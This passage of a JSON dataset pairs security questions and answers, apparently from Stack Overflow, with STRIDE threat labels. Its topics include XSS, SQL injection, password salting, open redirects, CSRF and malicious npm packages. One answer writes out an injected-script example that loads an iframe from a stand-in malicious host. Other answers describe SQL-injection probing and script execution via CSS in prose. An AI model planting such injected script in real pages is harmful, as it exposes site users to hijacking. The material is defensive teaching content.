to ask if you have more precise questions ! "
  },
  {
    "Threat": "T",
    "Attack": " I'd like to be able to allow community members to supply their own javascript code for others to use, because the users' imaginations are collectively far greater than anything I could think of.  Well createElement('iframe').src='http\u9225?//evil.iframeexploitz.ru/aff=2345' is one of the worse attacks you can expect... but really, when a script has control, it can do anything a user can on your site. It can make them post \u9225\u6dda'm a big old paedophile!\u9225?a thousand times on your forums and then delete their own account. For example. ",
    "Mitigation": " an example of the latter that may interest you is [LINK]. I'm not entirely sure I'd trust it; it's a hard job and they've certainly had some security holes so far, but it's about the best there is if you really must take this approach. "
  },
  {
    "Threat": "I",
    "Attack": " JSON allows you to [LINK] from an AJAX call. For example:  How does jQuery handle the parsing? Does it evaluate this code? What safeguards are in place to stop someone from hacking [CODE] and distributing malicious code? ",
    "Mitigation": " Therefore it is a very good idea to use a parsing function that validates the JSON string to ensure it contains no dodgy non-JSON javascript code, before using eval() in any form.    You can find such a function at [LINK].  See [LINK] for a good discussion of this area.  In summary, using JQuery's JSON functions without parsing the input JSON (using the above linked function or similar) is not 100% safe.  NB:  If this sort of parsing is still missing from getJSON (might have recently been added) it is even more important to understand this risk due to the cross domain capability, from the JQuery reference docs:    As of jQuery 1.2, you can load JSON  data located on another domain if you  specify a JSONP callback, which can be  done like so: \"myurl?callback=?\".  jQuery automatically replaces the ?  with the correct method name to call,  calling your specified callback. "
  },
  {
    "Threat": "E",
    "Attack": " I have a Java webapp which is vulnerable to the directory transversal (aka path transversal) attack via URL encoding. After being authenticated: ",
    "Mitigation": " I am going to answer my own question.<br/>So with the limited options I had, what I ended up doing is add in the Spring Security configuration file a security rule such as<br/>  [CODE]  It restricts access to WEB-INF to the 'no-access' role which is in fact not a role. That prevents access to all users. It is not ideal but will do the trick until there is an upgrade. "
  },
  {
    "Threat": "I",
    "Attack": " However, if I understand the purpose of salt correctly, it is to reduce the chance that you will be compromised by rainbow table attacks. So, I understand that by storing it in the database it would be optimal to change it for each user, but what if the salt is nowhere near the database? If I store a single salt value in the code (which would on the web server be in a compiled dll), wouldn't that serve the same purpose if an attacker were to somehow gain access to the database? It would seem to me to be more secure. ",
    "Mitigation": " The purpose of a salt is to require the regeneration of a rainbow table per password. If you use a single salt, the hacker/cracker only has to regenerate the rainbow table once and he has all your passwords. But if you generate a random one per user, he has to generate one per user. Much more expensive on the hackers part. This is why you can store a salt in plain text, it doesn't matter if the hacker knows it as long as there's more than one. "
  },
  {
    "Threat": "I",
    "Attack": " Part of the code :  But none of these methods worked. Is that code really secure? and how could someone send a null byte to bypass it's security. I want to demonstrate to my friend that his code is not secure. ",
    "Mitigation": " I've found [LINK] solution, in short, it seems your code is somewhat vulnerable, and the sanitizing method is this:     There are a number of ways to prevent Poison Null Byte injections within PHP. These include escaping the NULL byte with a backslash, however, the most recommended way to do so is to completely remove the byte by using code similar to the following:  [CODE]  I'm also not an expert in null-byte attacks, but this makes sense. Even more details [LINK]. "
  },
  {
    "Threat": "I",
    "Attack": " On more than one occasion I've been asked to implement rules for password selection for software I'm developing. Typical suggestions include things like:  Something has always bugged me about putting any restrictions on passwords though - by restricting the available passwords, you reduce the size of the space of all allowable passwords. Doesn't this make passwords easier to guess? ",
    "Mitigation": " In theory, yes. In practice, the \"weak\" passwords you disallow represent a tiny subset of all possible passwords that is disproportionately often chosen when there are no restrictions, and which attackers know to attack first.    Equally, by making users create  complex, frequently-changing  passwords, the temptation to write  them down increases, also reducing  security.  Correct. Forcing users to change passwords every month is a very, very bad idea, except perhaps in extreme high-security environments where everyone really understands the need for security. "
  },
  {
    "Threat": "T",
    "Attack": " I was asking myself about the security of using the php function htmlentities() against XSS attacks, and maybe of related functions such as htmlspecialchars.  You will need to explicitly specify proper encoding (e.g: utf-8), Chris had a post on how to inject code even calling htmlentities without appropriate encoding.  ",
    "Mitigation": " You will need to explicitly specify proper encoding (e.g: utf-8), Chris had a post on how to inject code even calling htmlentities without appropriate encoding.   [LINK] "
  },
  {
    "Threat": "S",
    "Attack": " By adding the crossdomain.xml, the main security concern is that flash applications can now connect to your server.  So if someone logs into your site, and then browses over to another website with a malicious flash app, that flash app can connect back to your site.  Since it's in a browser, cookies are shared to the flash app.  This allows the flash app to hijack the user's session to do whatever it is your website does without the user knowing about it. ",
    "Mitigation": " You can put it in a sub directory of your site and use System.security.loadSecurityPolicy()  [LINK]  Applications would then be limited to that tree of your directory structure. "
  },
  {
    "Threat": "T",
    "Attack": " my proble is to avoid that users upload some malicious file on my web-server.Im working on linux environment (debian).  here i can specify the extensions allowed to be uploaded, and if the file dont meet them i delete as soon as the upload is completed.But this way let the user free to change the file extension with a simple rename.. and thats bad for me; even if a file.exe (for example) wont never be executed if is renamed in file.jpg (am i right?), i dont want to have potential danger files on my server. ",
    "Mitigation": " You're going to need to validate that the uploaded file is actually the type that the extension indicates it is.  You can do that through various methods, probably the easiest is via the [CODE] command.  I don't know if it has an API.  You can try it out yourself in the shell.  For your example of file.exe that was renamed to file.jpg before being uploaded, run [CODE] and it will print out something telling you it's an executable.  It can be fooled, however.  I'm guessing you don't know much about Linux file permissions if you think .exe means it will be executed.  On linux, only the execute bit in the file permissions determine that -- you can execute any file, regardless of extension, if that bit is turned on.  Don't set it on any uploaded files and you should be safe from executing them.  You may still be serving them back up to your site's visitors, so it could still be a vector for XSS attacks, so watch out for that. "
  },
  {
    "Threat": "S",
    "Attack": " I've made a voting on comments like the one this website has(something similar), and I'm slightly concerned about possible http request misuse. You'll know what I mean after I show you the questionable code:  Not even user authentication is very helpful, you just tweak your malicious script to authenticate and you can do it again. How can I make this request more secure, what can I do? thank you ",
    "Mitigation": " At the bare minimum, you can make sure that every user can only vote once.   If user is not logged in, don't alow voting.If user is logged in, restrict voting to one vote per comment (whether they can change the vote from up to down or not is up to you)If you want to let unregistered users vote, lock them out with cookies and ip address and useragent checking. (Far from bulletproof, but will keep some troublemakers at bay)  Additional options:  Implement a captcha  In response to your edit:  If you are talking about checking for a valid referring page, you are out of luck. That is incredibly easily spoofed. You can implement a token check where you generate a hash that is valid for X seconds and deny all requests with an invalid or expired hash. This will not prevent people from voting multiple times though.  In response to your second edit:  A status code of 200 only means that the http request was successful, what the application logic decided to do with the request is a completely different issue. You can deny the vote and return a 200, just as you can return a 403 (which would probably be more appropriate in this case though). "
  },
  {
    "Threat": "E",
    "Attack": " My aim is creating an enviroment for developing applications managing sensible data: credit cards, passwords, and so on...A malicious developer may insert backdoor or intentionally alter some security features. So the access to the source code should be controlled strictly.I must confess that my knowledge of version control systems is poor, so, I fear, customizing SVN could be a hard task for me. ",
    "Mitigation": " [LINK] is widely used in the Finance Industry where security of code is sometimes an issue.  You can setup gatekeepers and access controls to restrict visibility of code and produce audit trails for various activities for SOX compliance. "
  },
  {
    "Threat": "S",
    "Attack": " From what I understand [CODE] only gets your cookies for the current site you are on.  Would it be possible for a malicious site to get around this by using an iFrame, modifying my HTTP header, making a request to the target site or some other method? ",
    "Mitigation": " [LINK] can be used to bypass Same Origin Policy (SOP) used by browsers to prevent one web site reading other website data like cookies, dom etc  [LINK] is a great video to learn how it works and how to prevent it.  "
  },
  {
    "Threat": "D",
    "Attack": " Any there any security implications caused by using the [CODE] and could it open a server up for attack?  If you use [CODE] just for generating C# source code, then you only need a permission to save the generated files to some directory or to noting at all (if it is possible to get the code generated into a memory stream)If you use it for compiling generated C# source, then you need a permission to run [CODE] (which may not be available in some limited environments such as shared hostings).If you just generate files &amp; compile them, then it probably won't be harmful (although someone could probably abuse your application to generate many, many files and attack the server using some kind of DOS attack.If you also load &amp; execute the generated code, then it depends on how you generate it. If you assume that there are no bugs in C#/CodeDOM and can guarantee that the generated code is safe, then you should be fine.If your code contain things such as [LINK] that can be provided by the user (in some way) than the user can write and run anything he or she wants on your server, so this would be potentially quite dangerous. ",
    "Mitigation": " If you use [CODE] just for generating C# source code, then you only need a permission to save the generated files to some directory or to noting at all (if it is possible to get the code generated into a memory stream)If you use it for compiling generated C# source, then you need a permission to run [CODE] (which may not be available in some limited environments such as shared hostings).If you just generate files &amp; compile them, then it probably won't be harmful (although someone could probably abuse your application to generate many, many files and attack the server using some kind of DOS attack.If you also load &amp; execute the generated code, then it depends on how you generate it. If you assume that there are no bugs in C#/CodeDOM and can guarantee that the generated code is safe, then you should be fine.If your code contain things such as [LINK] that can be provided by the user (in some way) than the user can write and run anything he or she wants on your server, so this would be potentially quite dangerous. "
  },
  {
    "Threat": "T",
    "Attack": " I inherited some code that was recently attacked by repeated remote form submissions.  However, the attacker now requests the form page first, starting a valid session, and then passes the session cookie in the following POST request. Therefore having a valid session token. So fail on my part. ",
    "Mitigation": " If you are having a human that attacks specifically your page, then you need to find what makes this attacker different from the regular user.   If he spams you with certain URLs or text or alike - block them after they are submitted.   You can also quarantine submissions - don't let them go for say 5 minutes. Within those 5 minutes if you receive another submission to the same form from the same IP - discard both posts and block the IP.   CAPTCHA is good if you use good CAPTCHA, cause many custom home-made captchas are now recognized automatically by specially crafted software.   To summarize - your problem needs not just technical, but more social solutions, aiming at neutralizing the botmaster rather than preventing the bot from posting.  "
  },
  {
    "Threat": "S",
    "Attack": " My problem is that I don't know how to prevent spoofing of the server requests that are made from Flash; in theory, malicious users could track the calls that Flash is making to my server and reproduce them in a way that (for example) inserts garbage data and associates it with a given Facebook user ID in my database.  All authentication is taking place on the client side (via the Facebook JS API) with no intervention by the server, so I'm having a hard time figuring out exactly how to secure calls between Flash and the server in a manner that ensures that users have to be authenticated with Facebook in order to make them. ",
    "Mitigation": " This is a legitimate concern because you are in violation of [LINK].  Encryption cannot help this station because a malicious client will be able to obtain any secret.   The best approach for verifying a client is to have the flash app send [LINK] back to the server.  The server then has to connect back to facebook using something like the [LINK] such that the server can verify that the client has a valid session with facebook.  This should be done once per login,  and then you can issue a session id (cookie) to the flash app to access your data store for that user.   "
  },
  {
    "Threat": "T",
    "Attack": " Are there ways to prevent, or make it difficult enough, for someone to inject Javascript and manipulate the variables or access functions? A thought I had is to change all var names randomly on each reload so the malware script would need to be rewritten every time? Or are there other less painful ways? ",
    "Mitigation": " You can write your JS to use only private methods and variables in a self-executing function. For example, the following code leaves no sign of itself in the global namespace for anyone to monkey with.   [CODE]    [EDIT]The above code is susceptible to a user overwriting any globally available objects, methods, events or properties you are using (in this case, [CODE], [CODE] and [CODE]), so if you are truly paranoid you can copy these to your function scope before the page has loaded and the user has a chance to overwrite them. Using [CODE] is a good idea because unlike the event [CODE], it cannot be removed or overwritten from outside the function.  "
  },
  {
    "Threat": "T",
    "Attack": " The problem is that users might upload code that attempts to 'hack' the system. I understand that in C and C++ it's easy to disable a certain set of system calls (patch a few .dll's), but I'm not so sure about other languages. ",
    "Mitigation": " Run in a sandbox as a non-privileged user.  That's not absolutely foolproof, but it makes the bar for doing lasting damage or serious compromise very high.  It also does not depend on possible options or modifications to the language run-time in question.  If you are dealing with a fully compiled language (that is, no run-time interpreter), you can do this as well.  For example, take Erlang.  Set up a [LINK] that contains only what you need to run Erlang.  Add a non-privileged user account and home directory.  Bring in the code to be run, verify all file/directory permissions, change to the non-privileged UID and run the code.  You can find more detailed instructions on setting up jails in the Wikipedia article referenced above.  Procedures and requirements are slightly different for different OSes. "
  },
  {
    "Threat": "T",
    "Attack": "   It is important to always be paranoid  about security when accepting any user  input, and this is also true when  binding objects to form input. You  should be careful to always HTML  encode any user-entered values to  avoid HTML and JavaScript injection  attacks ",
    "Mitigation": " You generally (but not always) want to HTML encode the values before writing them out, typically in your views, but possibly from the controller as well.  Some info here: [LINK] "
  },
  {
    "Threat": "T",
    "Attack": " Now the question arises, due to my lack of Xaml knowledge, is it possible to create malicious Xaml pages that when downloaded and used could have other embedded Iframes or other elements that could have embed html or call remote webpages with malicious content? I believe this could be the case. ",
    "Mitigation": " The solution is twofold:  Limit the classes that can be instantiated.Restrict the setting of Uri properties to relative sources only.  Limiting the classes that can be instantiated  Fortunately there are only a limited number of places types can appear:  Element names, Attached-property names, Markup extensions, properties of type \"Type\".  By disallowing any but the standard type extensions, it is quite simple to scan for all of usages and built a complete list of types referenced in the XAML.  This can be checked against a whitelist of known-safe types.  Any types referenced that aren't on the safe list cause the XAML to be rejected.  Note:  The built-in XamlReader doesn't allow you to provide a custom IXamlTypeResolver.  I use an enhanced XamlReader I wrote that that allows a custom IXamlTypeResolver, so I can actually detect every type that is referenced in the XAML at load time and run time without doing any parsing at all:  Just fail to resolve any type type not on the whitelist.  Restricting the setting of Uri properties  Again the rigid structure of XAML comes to our aid.  It can easily be scanned to determine every property setter that will be called and the value or binding to be set (don't forget styles and attached properties).  The XAML can be rejected if any absolute Uri except a pack Uri is used.  Attempts to set a Uri using a markup extension would be similarly rejected. "
  },
  {
    "Threat": "T",
    "Attack": " I need to prevent the characters that cause vulnerabilities in the URL.My sample URL is http://localhost/add.aspx?id=4;req=4.Please give the list of characters that I need block.I am using an [LINK] web page. I am binding the information from an [LINK] database.I just want to list the characters to stay away from hackers to enter unwanted strings in the URL. ",
    "Mitigation": " Depending on what technology you're using, there is usually a built-in function that will handle this for you.  ASP.NET (VB) &amp; Classic ASP  [CODE]  ASP.NET (C#)  [CODE]  PHP  [CODE]    If you simply would like to remove unsafe characters, you would need a regular expression. [LINK] defines what characters are unsafe for URLs:    Unsafe:    Characters can be unsafe for a  number of reasons.  The space  character is unsafe because  significant spaces may disappear and  insignificant spaces may be introduced  when URLs are transcribed or  typeset or subjected to the treatment  of word-processing programs.    The  characters \"&lt;\" and \">\" are unsafe  because they are used as the  delimiters around URLs in free text;  the quote mark (\"\"\") is used to  delimit URLs in some systems.  The  character \"#\" is unsafe and should  always be encoded because it is used  in World Wide Web and in other  systems to delimit a URL from a  fragment/anchor identifier that might   follow it.  The character \"%\" is  unsafe because it is used for  encodings of other characters.  Other  characters are unsafe because  gateways and other transport agents  are known to sometimes modify    such  characters. These characters are \"{\",  \"}\", \"|\", \"\\\", \"^\", \"~\",    \"[\", \"]\",  and \"`\". "
  },
  {
    "Threat": "T",
    "Attack": " I got these two functions from a book and the author says that by using these two, I can be extra safe against XSS(the first function) and sql injections(2nd func). Are all those necessary?  Also for sanitizing, I use prepared statements to prevent sql injections.  ",
    "Mitigation": " It's true, but this level of escaping may not be appropriate in all cases. What if you want to store HTML in a database?  Best practice dictates that, rather than escaping on receiving values, you should escape them when you display them. This allows you to account for displaying both HTML from the database and non-HTML from the database, and it's really where this sort of code logically belongs, anyway.  Another advantage of sanitizing outgoing HTML is that a new attack vector may be discovered, in which case sanitizing incoming HTML won't do anything for values that are already in the database, while outgoing sanitization will apply retroactively without having to do anything special  Also, note that [CODE] in your first function will likely have no effect, if all of the [CODE] and [CODE] have become [CODE] and [CODE]. "
  },
  {
    "Threat": "T",
    "Attack": " Clearly this is an SQL injection attempt. But why the constant shown above? I can't see how it could be particularly significant, though it seems to appear quite frequently. ",
    "Mitigation": " This value is a unique identifier.  If the value \"[CODE]\" appears on the page then the bot knows you are vulnerable to sql injection,  where as if the value \"[CODE]\" appears then it was not interpreted by your sql server.  This sql injection test probably starts off with only one 0x5E5B7D7E and then continues to a predefined number of them. This is because with a union select the union must return the same number of columns as the select it is being appended to,  and the bot must brute force this value.   Note,  that this test will not work with blind sql injection because the value \"[CODE]\" will not be visible.  A [LINK] for mysql would be injecting a call to [CODE] or [CODE].  This will cause the page to take a few seconds to load,  thus signifying that this sql code is being executed.  "
  },
  {
    "Threat": "T",
    "Attack": " Question: I'm using eval to parse a JSON return value from one of my WebMethods.<br /><br />I prefer not to add jquery-json because the transfer volume is already quite large.So I parse the JSON return value with eval.<br />Now rumors go that this is insecure. Why ? <br />Nobody can modify the JSOn return value unless they hack my server, in which case I would have a much larger problem anyway.<br />And if they do it locally, JavaScript only executes in their browser.So I fail to see where the problem is. <br /><br />Can anybody shed some light on this, using this concrete example?  The fundamental issue is that [CODE] can run any JavaScript, not just deserialize JSON-formatted data. That's the risk when using it to process JSON from an untrusted or semi-trusted source. The frequent trick of wrapping the JSON in parentheses is not sufficient to ensure that arbitrary JavaScript isn't executed. Consider this \"JSON\" which really isn't: ",
    "Mitigation": " The fundamental issue is that [CODE] can run any JavaScript, not just deserialize JSON-formatted data. That's the risk when using it to process JSON from an untrusted or semi-trusted source. The frequent trick of wrapping the JSON in parentheses is not sufficient to ensure that arbitrary JavaScript isn't executed. Consider this \"JSON\" which really isn't:  [CODE]  If you had that in a variable [CODE] and did this:  [CODE]  ...you'd see an alert -- the JavaScript ran. Security issue.  If your data is coming from a trusted source (and it sounds like it is), I wouldn't worry about it too much. That said, you might be interested in Crockford's discussion [LINK] (Crockford being the inventor of JSON and a generally-knowledgeable JavaScript person). Crockford also provides at least three public domain parsers on [LINK] you might consider using: His json2.js parser and stringifier, which when minified is only 2.5k in size, but which still uses [CODE] (it just takes several precautions first); his json_parse.js, which is a recursive-descent parser not using [CODE]; and his json_parse_state.js, a state machine parser (again not using [CODE]). So you get to pick your poison. (Shout out to [LINK] for pointing out those last two alternatives.) "
  },
  {
    "Threat": "S",
    "Attack": " Pretty simple and straight forward. Everything works fine. But I'm afraid that the websocket connection to Node.js is unsecure. When Node.js sends a message to the recipient, I don't want anyone snooping in between and intercepting the message. I would like to make sure my users feel safe and trust the service I have built for them. ",
    "Mitigation": " First you need to create an HTTPS server in node (for which you need a certificate):  [LINK][LINK]  Then you should use that server to initiate Socket.io.  [CODE]  That should basically be all there is to it.  There is two ways to secure your connection from man-in-the-middle attacks:  Using a signed certificate, and having the client check that signature. The internet is stuffed with explanations for why this actually a pretty poor solution.Making sure that the client refuses to connect with anything but your certificate. Any decent SSL/TLS library will allow you to specify a certificate that must be used for an outgoing connection, if the key on the server end doesn't match that certificate the connection is aborted. This does everything that the signature system should do, but doesn't rely on every single CA cert in the world being honest, or any of the other shortcomings of the CA system.  Your Django/Node.js combination sounds quite odd, is it correctly understood that clients make requests on one channel and receive the response on another channel?  While it could technically be okay, it sounds like a recipe for making odd vulnerabilities. If you must use both, consider making Node a proxy for the Django content and have Node handle all authentication.  In any case, I seriously doubt that encrypting just one of two channels is enough, once a hacker has pwned one channel there will most likely be a plethora of escalation options. "
  },
  {
    "Threat": "T",
    "Attack": " I think the biggest problem you'll face is that using event injection requires special application permissions - [LINK] to be exact.  Since granting an application this permission basically allows it to simulate input events into ANY application at any time, it is considered quite dangerous because a badly-written or intentionally malicious application could do a lot of damage.  Therefore many end-users and business do not allow applications that require this permission. ",
    "Mitigation": " I think the biggest problem you'll face is that using event injection requires special application permissions - [LINK] to be exact.  Since granting an application this permission basically allows it to simulate input events into ANY application at any time, it is considered quite dangerous because a badly-written or intentionally malicious application could do a lot of damage.  Therefore many end-users and business do not allow applications that require this permission. "
  },
  {
    "Threat": "S",
    "Attack": " Solutions (how to prevent hacker get an access if he/she stole the user's cookie): ",
    "Mitigation": " What you are looking for is [CODE] prevention. This [LINK] will explain to you what needs to be done. There is no need to parrot in here what is already said and done. [LINK] is a description of the attack with illustrations from [LINK]. "
  },
  {
    "Threat": "T",
    "Attack": " XSS injections  SQL Injection ",
    "Mitigation": " This is only a brief overview of what you can do with SQL injection. To protect yourself, use mysql_real_escape_string or PDO or any good DB abstraction layer. "
  },
  {
    "Threat": "I",
    "Attack": " Does such attack needs to be conducted with a kind of buffer overflow attack?  And when you read into [CODE] there's no overflow protection, and you can write directly into the memory location for [CODE]. Later on when your code tries to call [CODE], it will jump to where the attacker wants it to jump, presumably where they injected executable code into your app. ",
    "Mitigation": " Simple fix: Don't use static buffers (prefer the [CODE] collection classes) and always check for overflows. "
  },
  {
    "Threat": "T",
    "Attack": " The issue you might still be left with is a subset of SQL Injection called SQL Truncation. The idea is to force some part of the dynamic sql off the end of the string. I am not sure how likely this is to happen in practice, but, depending on how and where you are constructing the dynamic sql, you need to make sure that the variable holding the dynamic SQL to execute is large enough to hold the static pieces in your code plus all of the variables assuming they are submitted at their maximum lengths.  Here is an article from MSDN Magazine, [LINK], that shows both regular SQL Injection as well as SQL Truncation. You will see in the article that to avoid SQL Injection they mostly just do the [CODE] method, but also show using [CODE] for some situations. ",
    "Mitigation": " Here is an article from MSDN Magazine, [LINK], that shows both regular SQL Injection as well as SQL Truncation. You will see in the article that to avoid SQL Injection they mostly just do the [CODE] method, but also show using [CODE] for some situations.  EDIT (2015-01-20): Here is a good resource, though not specific to SQL Server, that details various types of SQL Injection:  [LINK]  The following article is related to the one above. This one is specific to SQL Server, but more general in terms of overall security. There are sections related to SQL Injection:[LINK] "
  },
  {
    "Threat": "S",
    "Attack": " I'm trying to prevent open redirect attack. Please look at the code below and check for security:  Is it enough for preventing open redirect attack or should I add anything else?    An http parameter may contain a URL value and could cause the web application to redirect the request to the specified URL. By modifying the URL value to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials. Because the server name in the modified link is identical to the original site, phishing attempts have a more trustworthy appearance.  The suggestion of [CODE] strategy to prevent open redirect attack: ",
    "Mitigation": "   Assume all input is malicious. Use an \"accept known good\" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.  Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.  Use a whitelist of approved URLs or domains to be used for redirection.  Use [CODE], [CODE] or [CODE] is insecure, because [CODE] can be forged (eg. a HTTP request have a custom [CODE] header to access a express app written in code below)  [CODE]  Use [CODE] to make a request:  [CODE]  I suggest you use whitelist to validate input, a example code below:  [CODE] "
  },
  {
    "Threat": "I",
    "Attack": " It seems to me that no matter which approach I will choose, someone who wants to hack it, will just need to reverse engineer My android appliaction code (which isn`t very hard) andcould see exactly what I do, wheather I encrypt the data, use hardcoded Password or any other solution for that matter. ",
    "Mitigation": " There is no 100% secure, all you can do is make things harder for your attacker. Things you can consider:  Encryption - Passing your requests over encrypted channels will stopbasic sniffing (this can be countered with MITM)Obfuscation - Make your intent harder to understand when they do decompile your app  The second part to this is mitigation - the ability to notice when your app has been compromised and deal with it. A typical way of handling this is to assign a unique token to each client on first run then pass this as an argument on each call to your service.   This way if somebody decompiles your app and figures out how to call your service you can at least start monitoring where the abusive requests are coming from and also monitor for suspicious behaviour (i.e. multiple requests from the same key in a short period across different IP addresses). From there you can start blocking keys. "
  },
  {
    "Threat": "T",
    "Attack": " Is there any way someone could construct a CSS file that would let them inject code into my site or otherwise gain access to things like my domain's cookies?  Is this really safe, or do I need to come up with a different solution?  No it is unsafe.  [CODE] and [CODE] are known ways to cause arbitrary script execution on certain browsers via CSS.  [LINK] suffered a very public XSS attack that was due to JavaScript embedded in user-supplied CSS. ",
    "Mitigation": "   With Mozilla deciding to allow the execution of arbitrary JavaScript via CSS, there is no other viable solution than the one we have undertaken.  From [LINK]:    Crafted CSS stylesheets can execute unsanitized javascript in the global scope on some browsers.    Background    CSS includes several mechanisms for changing the surrounding markup and executing expressions.    IE has an extension that allows execution of arbitrary javascript. The [CODE] property is described at [LINK]    Using the power of dynamic properties, it is now possible to declare property values not only as constants, but also as formulas. ... For scripting, a dynamic property can be any legal JScript or Microsoft Visual Basic Scripting Edition (VBScript) statement.  [LINK]    [CODE] allows binding to externally specified scripts  [LINK] &amp; [LINK]    [CODE] allows binding via the XML interface (also using data: URLs)    Assumptions    Untrusted code can generate style elements or style attributes or otherwise add arbitrary CSS rules and create DOM elements that trigger those rules.    Versions    IE 5 and later (but not IE 8 or later in \"standards mode\").    Mozilla/Firefox, versions not known. "
  },
  {
    "Threat": "I",
    "Attack": " I know that an attacker could just go down to the assemble code, and at that point there is nothing at all I can do against this (the system has to be able to encrypt / decrypt the data), but is there like a shortcut for C# to get the encrypPassword, since it is managed, or does something like this still require you to go down to the assemble code? ",
    "Mitigation": " If you have a fixed password compiled into your app, then you don't need to care about the security of AES and known security faults because your data is simply not secure. A sufficiently knowledgable person with access to the PC will be able to decrypt all the data.  And locating a fixed password usually doesn't require any programming knowledge. A good hex editor will do in most case. You don't even need to know what programming language was used.  If your data is used by a single user, then you can tie the password for the patient data to his or her Windows password (or account). Windows provides some specific functions for that. See [LINK] for how to access it from .NET. "
  },
  {
    "Threat": "D",
    "Attack": " If i wanna be malicious I am gonna do all my code in the finalizer thread and just block the VM. Same doing [CODE] bye-bye new threads. Eating all the memory, eating all direct memory and so on. Accessing zip files in my own jar, and expect 'em getting moved away, so the JVM crashes (due to bug(s) in zlib)  If one purposely wants to deny resources, it is just not a feasible task to try and catch the hacker. You'd need to know what to search for and dynamically check/enhance the classes on run-time to disallow the behavior.  ",
    "Mitigation": " If one purposely wants to deny resources, it is just not a feasible task to try and catch the hacker. You'd need to know what to search for and dynamically check/enhance the classes on run-time to disallow the behavior.  "
  },
  {
    "Threat": "T",
    "Attack": " I wonder whether an email address can be used for XSS attacks.   Let's suppose there is a website where one can register and gives his email address. If one wants to attack the given website, he or she might create an email address, such as this one:  [CODE]  and then use this email address to attack the website.  The email address in your example appears valid.  The only character that is unusual is the quote [CODE] -- rest others are valid. ",
    "Mitigation": " You need to ensure that arbitrary user input is sanitized before being rendered.  To begin with, you might want to refer to information about [LINK] and [LINK] available at [LINK]. "
  },
  {
    "Threat": "S",
    "Attack": " I'm looking for a transparent SSL/TLS proxy tool to capture (and change?) generic SSL/TLS traffic (man-in-the-middle attack). Basically something that can generate certificates on the fly with its own CA. In a way, I'm looking for something like [LINK], but for non-HTTP(S) traffic. Any suggestions? ",
    "Mitigation": " I found a tool called [LINK] that I believe does the trick. I did not have the time to test it yet, but the man page looks like it can do plain TCP/SSL sockets.  "
  },
  {
    "Threat": "T",
    "Attack": " By default does ASP.net protect against SQL injection attacks when using ASP controls? ",
    "Mitigation": " No. As long as you're supplying the SQL, it's up to you to be smart in how you use the controls.  That usually means sanitizing input and using Parameterized Queries or Stored Procedures over dynamic SQL strings.  If the control is generating the queries for you (like the Membership Controls, etc.) then you're well protected. "
  },
  {
    "Threat": "T",
    "Attack": " The problem is I have to comment out the setting [CODE] when creating the [CODE]. This exposes a security vulnerability.  ",
    "Mitigation": " Other answers are outdated, use [LINK] be sure to use [LINK] instead of send()[CODE] "
  },
  {
    "Threat": "D",
    "Attack": " The load this server is normally subjected to is minimal, but since there are no access restrictions, the server can obviously be attacked by DOS etc. ",
    "Mitigation": " I'd argue that your main concern should be following best security practices and keeping your software up to date than specifically which software you choose. It's just about impossible to predict future vulnerabilities. And software with a lot of past vulnerabilities doesn't necessarily mean it was less secure, likely it was targeted more often and thus fixed more often. In that regard you want software that is regularly updated and you have an easy way to routinely get those updates.  I'd suggest Tomcat and follow the steps from [LINK]. Tomcat has the benefit of being common and open source, so it gets a lot of attention and quick fixes. Many attacks are against things you don't even need, so disable everything you can. Configure your web.xml to only accept URL paths you expect and give an error for everything else.  It doesn't sound like you need Apache HTTPD in front of the web container. It's probably best then to reduce the number of attack vectors and have web requests go directly to the web container. It's not possible to know which of HTTPD or Java are going to have more vulnerabilities discovered for SSL and gzip. Yet if you use only Java then you're at least not open to the rest of what might be found for HTTPD, versus a limited set of native implementation concerns for Java.  Make sure Java and your web container are kept up to date. Network and OS hardening should be researched too, if they haven't been. You might also want to look into daily scanning for web vulnerabilities to stay on top of new threats. "
  },
  {
    "Threat": "T",
    "Attack": " In light of recent malware in existing npm packages, I would like to have a mechanism that lets me do some basic checks before installing new packages or updating existing ones. My main issue are both the packages I install directly, and also the ones I install indirectly.In general I want to get a list of package-version that npm would install before installing it. More specifically I want the age of the packages that would be installed, so I can generate a warning if any of them is less than a day old.If I could do that directly with npm, that would be neat, but I'm afraid I need to do some scripting around it.specific use case:If I executed [CODE] on 2021-10-22 it would have executed the post-install hook of a malicious version of ua-parser and my computer would have been compromised, which is something I would like to avoid.When I enter [CODE], it only tells me which version of react-native-gesture-handler it would have installed, but it would not tell me that it would install a version of ua-parser that was released on that day.additional notes:I know that [CODE] exists, but it shows only the direct packages.I know that [CODE] exists, but it only shows packages after installing (and thus after install-hooks have already done their harm)both only show packages version and not their ageI do not know how I would get a list of packages that would come with a install-hook before installing thempointers to alternative ways to deal with malicious npm packages are welcome.so far my best solution would be to do &quot;--ignore-scripts&quot; but that would come with it's own set of problems ",
    "Mitigation": " First install packages in a safe way, then use [CODE] and [CODE] to get the age of install packages.Option 1: install with [CODE][CODE]explanation of the script, that prints the dates:[CODE] get list of installed packages[CODE]extract the id of the package from each line[CODE] drop first line, which refers to the current folder[CODE] remove lines which refer to dupes[CODE] for each line open subshell[CODE] get time and package-id[CODE] remove line break between time and id, and add linebreak at the end[CODE] sort lines alphabeticallynote: since [CODE] fetches 1 package at a time via network, the script takes about 1s per installed packages, which will add up to a couple of minutes for medium-sized projects. "
  },
  {
    "Threat": "S",
    "Attack": " A Cross-Site Request Forgery attack rides on the victim's session to submit malicious requests to a trusted site. The [LINK] describes CAPTCHA as a good way to prevent CSRF attacks.  As we know, Google Re-Captcha is effective in preventing bot spamming. After it has been clicked several times at the location with the same IP address, it requires a human to solve a pictures puzzle. Since the first few attempts are simply 'free', is it possible for a hacker to bypass it by initiating clicking on the Re-Captcha figure at the first few attempts? ",
    "Mitigation": " As the OWASP cheat sheet mentions, CAPTCHAs can be used as a way to defeat CSRF.  However, you've got me thinking. Maybe if an attacker combined a [LINK] attack on the Google Recaptcha2 widget with a follow up from a CSRF attack on a page protected with Recaptcha2 for CSRF defense, then maybe this could work to the attacker's favour.  <h2>Update:</h2>  Having thought about this, the way that Recaptcha2 works is to return a  value signed by a private key that can be checked server side. This requires the CAPTCHA displayed on the current form to be clicked, even if there's nothing to be solved. Therefore Recapcha2 should defend against CSRF. However, make sure that your hosting page has protection from [LINK] too. "
  },
  {
    "Threat": "T",
